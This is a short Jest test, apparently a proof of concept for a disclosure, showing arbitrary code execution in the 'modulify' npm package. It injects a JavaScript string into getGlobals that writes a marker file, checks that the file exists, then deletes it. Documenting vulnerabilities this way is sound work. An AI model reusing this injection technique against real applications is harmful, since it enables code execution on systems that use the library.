//
test("Arbitrary code execution in modulify", () => {
  const fs = require("fs");
  const modulify = require("modulify");
  const path = "./modulify";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    modulify.utils.getGlobals("require(`fs`).writeFileSync(`modulify`,``)");
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
